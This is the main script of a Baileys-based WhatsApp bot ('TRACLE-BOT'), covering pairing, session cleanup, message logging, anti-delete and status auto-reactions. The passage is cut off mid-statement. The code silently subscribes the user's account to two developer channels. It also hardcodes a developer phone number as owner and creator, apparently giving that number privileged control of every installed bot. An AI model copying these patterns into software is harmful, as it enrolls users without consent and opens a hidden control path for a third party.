// First, import the entire baileys module to check what's available
const baileys = require('@whiskeysockets/baileys');

// Debug: Check what exports are available
console.log('Available baileys exports:', Object.keys(baileys));

// Extract the functions we need with proper fallbacks
const makeWASocket = baileys.default || baileys.makeWASocket;
const useMultiFileAuthState = baileys.useMultiFileAuthState;
const makeInMemoryStore = baileys.makeInMemoryStore;

// Destructure other functions that should be available
const {
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = baileys;

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, getSizeMedia } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino'); // Pino imported here
const config = require('./config.js');
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const prefix = config.PREFIX;
const readline = require('readline');

// Add these missing imports for sticker functions
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/sticker-utils');

const ownerNumber = ['2348125101930'];

// ===== CHANNEL CONFIGURATION =====
const CHANNEL_JIDS = [
    "120363401559573199@newsletter",
    "120363419757200867@newsletter"
];

// ===== STORE INITIALIZATION (MOVED AFTER PINO IMPORT) =====
// Check if makeInMemoryStore is available, if not provide a fallback
if (!makeInMemoryStore) {
    console.warn('makeInMemoryStore not found in baileys exports. Using mock store.');
    
    // Mock store implementation with silent methods
    const mockMakeInMemoryStore = (options = {}) => {
        console.log('Using mock in-memory store');
        return {
            readFromFile: (file) => {
                // Silent read - no console output
            },
            writeToFile: (file) => {
                // Silent write - no console output for mock writes
            },
            bind: (sock) => {
                // Silent bind
            },
            // Initialize contacts as an empty object to prevent the error
            contacts: {},
            // Add other necessary methods as empty functions
            toJSON: () => ({}),
            fromJSON: () => {},
            // Add other necessary methods as empty functions or simple implementations
        };
    };
    
    // Use the mock store
    var store = mockMakeInMemoryStore({ logger: P().child({ level: 'debug', stream: 'store' }) });
} else {
    // Use the real store
    var store = makeInMemoryStore({ logger: P().child({ level: 'debug', stream: 'store' }) });
}

// Ensure store.contacts exists even if it's a real store
if (!store.contacts) {
    store.contacts = {};
}

// Store initialization (now using the variable that could be either real or mock)
// Only read/write if it's a real store, mock store methods are silent
if (makeInMemoryStore) {
    store.readFromFile('./baileys_store_multi.json');
    setInterval(() => {
        store.writeToFile('./baileys_store_multi.json');
    }, 10_000);
} else {
    // For mock store, just log once that we're using mock storage
    console.log('Using mock store - no persistent storage');
}
// ===== END OF STORE INITIALIZATION =====
const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
}

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) {
            console.error("Error reading temp directory:", err);
            return;
        }
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) console.error("Error deleting temp file:", err);
            });
        }
    });
};

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

// Create readline interface for user input
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Function to ask for phone number
function askForPhoneNumber() {
    return new Promise((resolve) => {
        rl.question('Please enter your WhatsApp number (with country code, e.g., 2344567890): ', (answer) => {
            resolve(answer.trim());
        });
    });
}

// Function to delay execution
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

let pairingTimeout = null;
let isPairing = false;
let currentConnection = null;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;
let hasShownConnectedMessage = false; // Track if connected message has been shown
let isUserLoggedIn = false; // Track login state globally

// ===== BAILEYS VERSION CHECK =====
async function checkBaileysVersion() {
    try {
        const { version, isLatest } = await fetchLatestBaileysVersion();
        console.log(`${colors.cyan}📦 Current Baileys version: ${version}${colors.reset}`);
        console.log(`${colors.cyan}🔄 Latest available: ${isLatest ? 'Yes' : 'No'}${colors.reset}`);
        
        if (!isLatest) {
            console.log(`${colors.yellow}⚠️ Consider updating Baileys for newsletter features:${colors.reset}`);
            console.log(`${colors.yellow}   npm update @whiskeysockets/baileys${colors.reset}`);
        }
        return { version, isLatest };
    } catch (error) {
        console.log(`${colors.yellow}⚠️ Could not check Baileys version${colors.reset}`);
        return { version: 'unknown', isLatest: false };
    }
}

// ===== ENHANCED CHANNEL SUBSCRIPTION FUNCTION =====
async function subscribeToChannels(conn) {
    const results = [];
    
    for (const channelJid of CHANNEL_JIDS) {
        try {
            console.log(`${colors.cyan}📢 Attempting to subscribe to channel: ${channelJid}${colors.reset}`);
            
            let result;
            let methodUsed = 'unknown';
            
            // Try different approaches in sequence
            if (conn.newsletterFollow) {
                methodUsed = 'newsletterFollow';
                result = await conn.newsletterFollow(channelJid);
            } 
            else if (conn.followNewsletter) {
                methodUsed = 'followNewsletter';
                result = await conn.followNewsletter(channelJid);
            }
            else if (conn.subscribeToNewsletter) {
                methodUsed = 'subscribeToNewsletter';
                result = await conn.subscribeToNewsletter(channelJid);
            }
            else if (conn.newsletter && conn.newsletter.follow) {
                methodUsed = 'newsletter.follow';
                result = await conn.newsletter.follow(channelJid);
            }
            else {
                // Manual approach - only use presence, don't send messages
                methodUsed = 'manual_presence_only';
                
                // Set presence to indicate following (silent method)
                await conn.sendPresenceUpdate('available', channelJid);
                
                // Wait a bit for the subscription to process
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                result = { status: 'presence_only_method' };
            }
            
            console.log(`${colors.green}✅ Successfully subscribed to channel using ${methodUsed}!${colors.reset}`);
            results.push({ success: true, result, method: methodUsed, channel: channelJid });
            
        } catch (error) {
            console.error(`${colors.red}❌ Failed to subscribe to channel ${channelJid}:${colors.reset}`, error.message);
            
            // Try fallback method (silent - no messages)
            try {
                console.log(`${colors.cyan}🔄 Trying silent fallback subscription method for ${channelJid}...${colors.reset}`);
                
                // Use presence subscription as fallback (no messages)
                await conn.sendPresenceUpdate('available', channelJid);
                
                // Just wait without sending any messages
                await new Promise(resolve => setTimeout(resolve, 3000));
                
                console.log(`${colors.green}✅ Used silent fallback subscription method for ${channelJid}!${colors.reset}`);
                results.push({ success: true, result: 'silent_fallback_method', channel: channelJid });
            } catch (fallbackError) {
                console.error(`${colors.red}❌ Silent fallback subscription also failed for ${channelJid}:${colors.reset}`, fallbackError.message);
                results.push({ success: false, error: fallbackError, channel: channelJid });
            }
        }
        
        // Add a small delay between channel subscriptions
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    return results;
}

// Session cleanup function - Only clean up when logged out
async function cleanSessionFolder() {
    const sessionDir = path.join(__dirname, 'sessions');
    
    try {
        // Check if session directory exists
        try {
            await fs.promises.access(sessionDir);
        } catch {
            console.log("Session directory doesn't exist, skipping cleanup");
            return;
        }
        
        // Check if we have an active connection that's logged in
        const isLoggedIn = isUserLoggedIn || (currentConnection && 
                          currentConnection.connection === 'open' && 
                          currentConnection.user);
        
        if (isLoggedIn) {
            console.log("✅ User is logged in - skipping session cleanup");
            return;
        }
        
        // Read all files in session directory
        const files = await fs.promises.readdir(sessionDir);
        let deletedCount = 0;
        let keptCount = 0;
        
        for (const file of files) {
            // Skip creed.json and any other files you want to keep
            if (file === 'creed.json' || file === '.gitkeep' || file === 'README.md') continue;
            
            const filePath = path.join(sessionDir, file);
            const stat = await fs.promises.stat(filePath);
            
            // Only delete files (not directories) and only if they're older than 30 minutes
            if (stat.isFile()) {
                const fileAge = Date.now() - stat.mtimeMs;
                const thirtyMinutes = 30 * 60 * 1000; // 30 minutes in milliseconds
                
                if (fileAge > thirtyMinutes) {
                    await fs.promises.unlink(filePath);
                    console.log(`🗑️ Deleted old session file: ${file}`);
                    deletedCount++;
                } else {
                    keptCount++;
                    console.log(`💾 Keeping recent session file: ${file} (${Math.round(fileAge/60000)} min old)`);
                }
            }
        }
        
        if (deletedCount > 0) {
            console.log(`✅ Session cleanup completed: ${deletedCount} files deleted, ${keptCount} files kept`);
        } else if (keptCount > 0) {
            console.log(`✅ No old session files to delete - ${keptCount} recent files preserved`);
        } else {
            console.log("✅ No session files found to clean up");
        }
    } catch (error) {
        console.error("❌ Error during session cleanup:", error);
    }
}

// Store cleanup function - Only clean up when logged out
async function cleanStoreFolder() {
    const storeFile = './baileys_store_multi.json';
    
    try {
        // Check if store file exists
        try {
            await fs.promises.access(storeFile);
        } catch {
            console.log("Store file doesn't exist, skipping cleanup");
            return;
        }
        
        // Check if we have an active connection that's logged in
        const isLoggedIn = isUserLoggedIn || (currentConnection && 
                          currentConnection.connection === 'open' && 
                          currentConnection.user);
        
        if (isLoggedIn) {
            console.log("✅ User is logged in - skipping store cleanup");
            return;
        }
        
        const stat = await fs.promises.stat(storeFile);
        const fileAge = Date.now() - stat.mtimeMs;
        const thirtyMinutes = 30 * 60 * 1000;
        
        if (fileAge > thirtyMinutes) {
            await fs.promises.unlink(storeFile);
            console.log(`🗑️ Deleted old store file: baileys_store_multi.json`);
        } else {
            console.log(`💾 Keeping recent store file (${Math.round(fileAge/60000)} min old)`);
        }
    } catch (error) {
        console.error("❌ Error during store cleanup:", error);
    }
}

// Combined cleanup function
async function combinedCleanup() {
    await cleanSessionFolder();
    await cleanStoreFolder();
}

// Run cleanup every 30 minutes (30 * 60 * 1000 milliseconds)
setInterval(combinedCleanup, 30 * 60 * 1000);

// Also run cleanup on startup
combinedCleanup().catch(console.error);

// Connection state checking utility
function isConnectionOpen(conn) {
    return conn && conn.connection === 'open' && conn.user;
}

// Function to get message type
function getMessageType(mek) {
    if (mek.message?.conversation) return 'TEXT';
    if (mek.message?.extendedTextMessage) return 'TEXT';
    if (mek.message?.imageMessage) return 'IMAGE';
    if (mek.message?.videoMessage) return 'VIDEO';
    if (mek.message?.audioMessage) return 'AUDIO';
    if (mek.message?.documentMessage) return 'DOCUMENT';
    if (mek.message?.stickerMessage) return 'STICKER';
    if (mek.message?.contactMessage) return 'CONTACT';
    if (mek.message?.locationMessage) return 'LOCATION';
    
    // Check for other message types
    const messageKeys = Object.keys(mek.message || {});
    for (const key of messageKeys) {
        if (key.endsWith('Message')) {
            return key.replace('Message', '').toUpperCase();
        }
    }
    
    return 'UNKNOWN';
}

// Function to get message text
function getMessageText(mek, messageType) {
    switch (messageType) {
        case 'TEXT':
            return mek.message?.conversation || 
                   mek.message?.extendedTextMessage?.text || '';
        case 'IMAGE':
            return mek.message?.imageMessage?.caption || '[Image]';
        case 'VIDEO':
            return mek.message?.videoMessage?.caption || '[Video]';
        case 'AUDIO':
            return '[Audio]';
        case 'DOCUMENT':
            return mek.message?.documentMessage?.fileName || '[Document]';
        case 'STICKER':
            return '[Sticker]';
        case 'CONTACT':
            return '[Contact]';
        case 'LOCATION':
            return '[Location]';
        default:
            return `[${messageType}]`;
    }
}

// Function to extract phone number from JID
function getPhoneNumberFromJid(jid) {
    if (!jid) return 'Unknown';
    
    try {
        // Handle different JID formats
        if (jid.includes('@s.whatsapp.net')) {
            const number = jid.split('@')[0];
            // Validate it's a number and not empty
            return number && !isNaN(number) && number.length > 3 ? number : 'Unknown';
        } else if (jid.includes('@g.us')) {
            return 'Group';
        } else if (jid.includes('@broadcast')) {
            return 'Broadcast';
        } else if (jid.includes(':')) {
            const parts = jid.split(':');
            if (parts.length > 1) {
                const number = parts[0];
                return number && !isNaN(number) && number.length > 3 ? number : 'Unknown';
            }
        }
        
        return 'Unknown';
    } catch (error) {
    console.error("Error parsing JID:", error);
    return 'Unknown';
    }
}

// Enhanced Color codes for console output
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    underscore: '\x1b[4m',
    blink: '\x1b[5m',
    reverse: '\x1b[7m',
    hidden: '\x1b[8m',
    
    // Vibrant foreground colors
    black: '\x1b[30m',
    red: '\x1b[38;5;196m',      // Bright red
    green: '\x1b[38;5;46m',     // Bright green
    yellow: '\x1b[38;5;226m',   // Bright yellow
    blue: '\x1b[38;5;33m',      // Bright blue
    magenta: '\x1b[38;5;201m',  // Bright magenta
    cyan: '\x1b[38;5;51m',      // Bright cyan
    white: '\x1b[38;5;255m',    // Bright white
    orange: '\x1b[38;5;208m',   // Orange
    pink: '\x1b[38;5;213m',     // Pink
    purple: '\x1b[38;5;129m',   // Purple
    
    // Background colors
    bgBlack: '\x1b[40m',
    bgRed: '\x1b[41m',
    bgGreen: '\x1b[42m',
    bgYellow: '\x1b[43m',
    bgBlue: '\x1b[44m',
    bgMagenta: '\x1b[45m',
    bgCyan: '\x1b[46m',
    bgWhite: '\x1b[47m'
};

//=====CONNECTION FUNCTION ======
async function connectToWA() {
    // Check Baileys version first
    await checkBaileysVersion();
    
    console.log("🔗 Connecting to WhatsApp ⏳️...");
    
    // Check if we have existing credentials
    let state;
    let saveCreds;
    
    try {
        // Try to use existing auth state if available
        const authState = await useMultiFileAuthState(__dirname + '/sessions/').catch(error => {
            console.log("❌ Error loading existing session:", error.message);
            throw error;
        });
        state = authState.state;
        saveCreds = authState.saveCreds;
    } catch (error) {
        console.log("ℹ️ No existing session found or error loading session, starting fresh pairing...");
        // Create a minimal state for fresh connection
        state = {
            creds: {
                noiseKey: { private: Buffer.alloc(32), public: Buffer.alloc(32) },
                signedIdentityKey: { private: Buffer.alloc(32), public: Buffer.alloc(32) },
                signedPreKey: { 
                    keyPair: { private: Buffer.alloc(32), public: Buffer.alloc(32) }, 
                    signature: Buffer.alloc(64), 
                    keyId: 1 
                },
                registrationId: 0,
                advSecretKey: Buffer.alloc(32).toString('base64'),
                processedHistoryMessages: [],
                nextPreKeyId: 1,
                firstUnuploadedPreKeyId: 1,
                account: {
                    details: '',
                    accountSignatureKey: Buffer.alloc(32),
                    accountSignature: Buffer.alloc(64),
                    deviceSignature: Buffer.alloc(64)
                },
                me: null,
                accountSettings: {
                    unarchiveChats: false
                }
            },
            keys: {}
        };
        
        saveCreds = () => {
            console.log("💾 Credentials updated, but not saving for pairing mode");
        };
    }
    
    try {
        var { version } = await fetchLatestBaileysVersion().catch(error => {
            console.error("❌ Error fetching Baileys version:", error);
            throw error;
        });

        const conn = makeWASocket({
            logger: P({ level: 'silent' }),
            printQRInTerminal: false,
            browser: Browsers.macOS("Firefox"),
            syncFullHistory: true,
            auth: state,
            version
        });

        currentConnection = conn;
        store.bind(conn.ev);

        // ===== SAFE GETNAME FUNCTION (REPLACEMENT) =====
        conn.getName = (jid, withoutContact = false) => {
            try {
                let id = conn.decodeJid(jid);
                withoutContact = conn.withoutContact || withoutContact;
                let v;

                // Ensure store.contacts exists before accessing it
                if (!store.contacts) {
                    store.contacts = {};
                }

                if (id.endsWith('@g.us')) {
                    return new Promise(async resolve => {
                        try {
                            v = store.contacts[id] || {};
                            if (!(v.name || v.subject)) {
                                v = await conn.groupMetadata(id).catch(() => ({}));
                            }
                            
                            // Return group name or subject if available
                            if (v.name || v.subject) {
                                resolve(v.name || v.subject);
                            } else {
                                // Safe fallback without using awesome-phonenumber
                                resolve(id.split('@')[0] || 'Group');
                            }
                        } catch (error) {
                            console.error("❌ Error in getName for group:", error);
                            resolve('Group'); // Safe fallback
                        }
                    });
                } else {
                    v = id === '0@s.whatsapp.net'
                        ? { id, name: 'WhatsApp' }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

                    // Return available names without using awesome-phonenumber
                    return (withoutContact ? '' : v.name) ||
                           v.subject ||
                           v.verifiedName ||
                           id.split('@')[0] || // Simple fallback without phone number formatting
                           jid; // Final fallback
                }
            } catch (error) {
                console.error("❌ Error in getName:", error);
                return jid; // Return original JID on error
            }
        };

        // Add error handler for the connection
        conn.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            // Track login state
            if (connection === 'open') {
                isUserLoggedIn = true;
                console.log("✅ User logged in successfully");
                
                // Reset reconnect counter on successful connection
                reconnectAttempts = 0;
                
                // Show connected message only once
                if (!hasShownConnectedMessage) {
                    hasShownConnectedMessage = true;
                    console.log(`${colors.green}${colors.bright}✅ Bot connected successfully!${colors.reset}`);
                    console.log(`${colors.cyan}📱 Channel: https://whatsapp.com/channel/0029VbBPPXV3WHTTNAWOGf0m${colors.reset}`);
                    console.log(`${colors.cyan}🌟 Repo: https://github.com/Brenaldmedia/Tracle${colors.reset}`);
                    console.log(`${colors.green}🧬 Installing Plugins...${colors.reset}`);
                    
                    try {
                        fs.readdirSync("./plugins/").forEach((plugin) => {
                            if (path.extname(plugin).toLowerCase() == ".js") {
                                require("./plugins/" + plugin);
                            }
                        });
                        console.log(`${colors.green}✅ Plugins installed successfully!${colors.reset}`);
                        
                        // ===== CHANNEL SUBSCRIPTION AFTER SUCCESSFUL CONNECTION =====
                        setTimeout(async () => {
                            const subscriptionResults = await subscribeToChannels(conn);
                            
                            let name = conn.user.name || "User";
                            
                            // Create channel status message
                            let channelStatus = "";
                            subscriptionResults.forEach((result, index) => {
                                const status = result.success ? "✅ Followed" : "❌ Not followed";
                                channelStatus += `📢 Channel ${index + 1}: ${status}\n`;
                            });

                            let up = `
┏━━━✨ *TRACLE-BOT* ✨━━━┓

👋 Hey *${name}* 🤩  
🎉 Pairing Complete – You're good to go!  

📌 *Prefix:* \`${prefix}\`  
${channelStatus}⭐ *Fork My repo* : https://github.com/Brenaldmedia/Tracle  

┗━━━━━━━━━━━━━━━━━━━━┛
`;

                            // Send the welcome message with channel status
                            conn.sendMessage(conn.user.id, { 
                                image: { url: `https://files.catbox.moe/4zbgw2.png` }, 
                                caption: up 
                            }).catch(console.error);

                        }, 3000); // Wait 3 seconds before subscribing
                        // ===== END CHANNEL SUBSCRIPTION =====
                        
                    } catch (error) {
                        console.error("❌ Error installing plugins:", error);
                    }
                }
            } else if (connection === 'close') {
                isUserLoggedIn = false;
                console.log("❌ User logged out");
                
                const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut;
                
                if (shouldReconnect) {
                    reconnectAttempts++;
                    if (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS) {
                        console.log(`🔁 Connection closed, reconnecting... (Attempt ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})`);
                        setTimeout(connectToWA, 5000); // Reconnect after 5 seconds
                    } else {
                        console.log("❌ Max reconnection attempts reached. Please restart the bot.");
                    }
                } else {
                    console.log("🔒 Logged out, please pair code again.");
                    // Reset reconnect attempts on logout
                    reconnectAttempts = 0;
                    setTimeout(connectToWA, 3000); // Try to reconnect after logout
                }
            } else if (qr) {
                // If we get a QR code but we want to use pairing codes instead
                if (!isPairing) {
                    isPairing = true;
                    console.log("\n📱 QR code received, but we'll use pairing code instead...");
                    
                    try {
                        // Get the phone number for pairing
                        const number = await askForPhoneNumber();
                        if (!number) {
                            console.log('❌ Phone number is required to pair with WhatsApp.');
                            process.exit(1);
                        }
                        
                        console.log(`🔗 Pairing with number: ${number}`);
                        
                        // Request pairing code
                        const pairingCode = await conn.requestPairingCode(number);
                        console.log("\n🔑 Pairing Code from WhatsApp:");
                        console.log("══════════════════════════════");
                        console.log(`${colors.yellow}${pairingCode.split("").join(" ")}${colors.reset}`);
                        console.log("══════════════════════════════");
                        console.log("Enter this code in WhatsApp to complete pairing.");
                        console.log("The bot will automatically restart when paired successfully.");
                        
                        // Set timeout for pairing (15 minutes)
                        if (pairingTimeout) clearTimeout(pairingTimeout);
                        pairingTimeout = setTimeout(() => {
                            console.log("\n⏰ Pairing timeout. Please try again.");
                            isPairing = false;
                            reconnectAttempts = 0;
                            setTimeout(connectToWA, 3000); // Retry connection
                        }, 15 * 60 * 1000);
                        
                    } catch (error) {
                        console.error('❌ Error during pairing:', error.message);
                        isPairing = false;
                        setTimeout(connectToWA, 5000); // Retry after error
                    }
                }
            }
        });
        
        conn.ev.on('creds.update', saveCreds);

        // Handle other events with proper error handling
        conn.ev.on('messages.update', async updates => {
            try {
                for (const update of updates) {
                    if (update.update && update.update.message === null) {
                        console.log("🗑️ Delete Detected:", JSON.stringify(update, null, 2));
                        await AntiDelete(conn, updates);
                    }
                }
            } catch (error) {
                console.error("❌ Error in messages.update:", error);
            }
        });

        // Handle connection errors
        conn.ev.on('connection.update', (update) => {
            if (update.connection === 'close') {
                const error = update.lastDisconnect?.error;
                if (error) {
                    console.error('❌ Connection error:', error);
                }
            }
        });

        //============= MESSAGE PRINTING HANDLER =============
        conn.ev.on('messages.upsert', async(mek) => {
            try {
                if (!mek.messages || mek.messages.length === 0) return;
                mek = mek.messages[0];
                if (!mek.message) return;
                
                // ===== PRINT USER MESSAGES =====
                const from = mek.key.remoteJid;
                const isGroup = from.endsWith('@g.us');
                const sender = mek.key.fromMe ? conn.user.id : (mek.key.participant || mek.key.remoteJid);
                const isFromBot = mek.key.fromMe;
                
                // Format timestamp
                const timestamp = new Date(mek.messageTimestamp * 1000).toLocaleTimeString();
                
                // Only print messages from others (not from the bot itself)
                if (!isFromBot) {
                    // Get the sender's name (pushname) from the message
                    const senderName = mek.pushName || 'Unknown User';
                    
                    // Get message type and text
                    const messageType = getMessageType(mek);
                    let messageText = getMessageText(mek, messageType);
                    
                    // Format the output with colors
                    if (isGroup) {
                        try {
                            // Safe group name retrieval with timeout protection
                            let groupName = 'Group';
                            try {
                                groupName = await Promise.race([
                                    conn.getName(from),
                                    new Promise(resolve => setTimeout(() => resolve('Group'), 2000))
                                ]);
                            } catch (error) {
                                console.error("❌ Error getting group name:", error);
                            }
                            
                            console.log(`${colors.cyan}[${timestamp}] ${colors.yellow}[GROUP: ${groupName}] ${colors.green}${senderName}: ${colors.reset}${messageText} ${colors.dim}(${messageType})${colors.reset}`);
                        } catch (error) {
                            // Fallback to showing just the username if we can't get the group name
                            console.log(`${colors.cyan}[${timestamp}] ${colors.yellow}[GROUP] ${colors.green}${senderName}: ${colors.reset}${messageText} ${colors.dim}(${messageType})${colors.reset}`);
                        }
                    } else {
                        // For private messages, show the username
                        console.log(`${colors.cyan}[${timestamp}] ${colors.purple}[PRIVATE] ${colors.green}${senderName}: ${colors.reset}${messageText} ${colors.dim}(${messageType})${colors.reset}`);
                    }
                }
                // ===== END OF MESSAGE PRINTING =====
                
                // Continue with your existing message processing
                mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                    ? mek.message.ephemeralMessage.message 
                    : mek.message;
                
                if (config.READ_MESSAGE === 'true') {
                    await conn.readMessages([mek.key]).catch(console.error);
                }
                
                if (mek.message && mek.message.viewOnceMessageV2) {
                    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                        ? mek.message.ephemeralMessage.message 
                        : mek.message;
                }
                
                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
                    await conn.readMessages([mek.key]).catch(console.error);
                }
                
                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
                    const tracle = await conn.decodeJid(conn.user.id);
                    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
                    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                    await conn.sendMessage(mek.key.remoteJid, {
                        react: {
                            text: randomEmoji,
                            key: mek.key,
                        } 
                    }, { statusJidList: [mek.key.participant, tracle] }).catch(console.error);
                }                       
                
                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
                    const user = mek.key.participant;
                    const text = `${config.AUTO_STATUS_MSG}`;
                    await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek }).catch(console.error);
                }
                
                await Promise.all([
                    saveMessage(mek).catch(console.error),
                ]);
                
            } catch (error) {
                console.error("❌ Error in messages.upsert:", error);
            }
        });
        //=============END OF MESSAGE PRINTING HANDLER =============

        //=============END OF CONNECTION =================
        conn.ev.on("group-participants.update", (update) => {
            try {
                GroupEvents(conn, update);
            } catch (error) {
                console.error("❌ Error in group-participants.update:", error);
            }
        });

        //=============readstatus=======
                
        conn.ev.on('messages.upsert', async(mek) => {
            try {
                if (!mek.messages || mek.messages.length === 0) return;
                mek = mek.messages[0];
                if (!mek.message) return;
                
                mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                    ? mek.message.ephemeralMessage.message 
                    : mek.message;
                
                if (config.READ_MESSAGE === 'true') {
                    await conn.readMessages([mek.key]).catch(console.error);
                    console.log(`📖 Marked message from ${mek.key.remoteJid} as read.`);
                }
                
                if (mek.message && mek.message.viewOnceMessageV2) {
                    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                        ? mek.message.ephemeralMessage.message 
                        : mek.message;
                }
                
                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
                    await conn.readMessages([mek.key]).catch(console.error);
                }
                
                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
                    const tracle = await conn.decodeJid(conn.user.id);
                    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
                    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                    await conn.sendMessage(mek.key.remoteJid, {
                        react: {
                            text: randomEmoji,
                            key: mek.key,
                        } 
                    }, { statusJidList: [mek.key.participant, tracle] }).catch(console.error);
                }                       
                
                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
                    const user = mek.key.participant;
                    const text = `${config.AUTO_STATUS_MSG}`;
                    await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek }).catch(console.error);
                }
                
                await Promise.all([
                    saveMessage(mek).catch(console.error),
                ]);
                
                const m = sms(conn, mek);
                const type = getContentType(mek.message);
                const content = JSON.stringify(mek.message);
                const from = mek.key.remoteJid;
                const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage && mek.message.extendedTextMessage.contextInfo != null 
                    ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] 
                    : [];
                
                let body = '';
                if (type === 'conversation') {
                    body = mek.message.conversation || '';
                } else if (type === 'extendedTextMessage') {
                    body = mek.message.extendedTextMessage.text || '';
                } else if (type == 'imageMessage' && mek.message.imageMessage && mek.message.imageMessage.caption) {
                    body = mek.message.imageMessage.caption || '';
                } else if (type == 'videoMessage' && mek.message.videoMessage && mek.message.videoMessage.caption) {
                    body = mek.message.videoMessage.caption || '';
                }
                
                const isCmd = body.startsWith(prefix);
                var budy = typeof mek.text == 'string' ? mek.text : false;
                const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
                const args = body.trim().split(/ +/).slice(1);
                const q = args.join(' ');
                const text = args.join(' ');
                const isGroup = from.endsWith('@g.us');
                const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
                const senderNumber = sender.split('@')[0];
                const botNumber = conn.user.id.split(':')[0];
                const pushname = mek.pushName || 'Sin Nombre';
                const isMe = botNumber.includes(senderNumber);
                const isOwner = ownerNumber.includes(senderNumber) || isMe;
                const botNumber2 = await jidNormalizedUser(conn.user.id);
                
                // FIXED: Add safety check for groupMetadata with timeout protection
                let groupMetadata = null;
                let groupName = '';
                let participants = [];
                let groupAdmins = [];
                let isBotAdmins = false;
                let isAdmins = false;
                
                if (isGroup) {
                    try {
                        groupMetadata = await Promise.race([
                            conn.groupMetadata(from),
                            new Promise((_, reject) => 
                                setTimeout(() => reject(new Error('Group metadata timeout')), 8000)
                            )
                        ]).catch(e => {
                            console.error("❌ Group metadata fetch timeout:", e.message);
                            return null;
                        });
                        
                        groupName = groupMetadata ? groupMetadata.subject : '';
                        participants = groupMetadata ? groupMetadata.participants : [];
                        groupAdmins = isGroup ? await getGroupAdmins(participants) : [];
                        isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
                        isAdmins = isGroup ? groupAdmins.includes(sender) : false;
                    } catch (error) {
                        console.error("❌ Error processing group data:", error);
                        // Set default values to prevent crashes
                        groupMetadata = null;
                        groupName = '';
                        participants = [];
                        groupAdmins = [];
                        isBotAdmins = false;
                        isAdmins = false;
                    }
                }

                const isReact = m.message && m.message.reactionMessage ? true : false;
                const reply = (teks) => {
                    conn.sendMessage(from, { text: teks }, { quoted: mek }).catch(console.error);
                };
                
                const udp = botNumber.split('@')[0];
                const tracle = ('2348125101930', '2348125101930', '2348125101930');
                let isCreator = [udp, tracle, config.DEV]
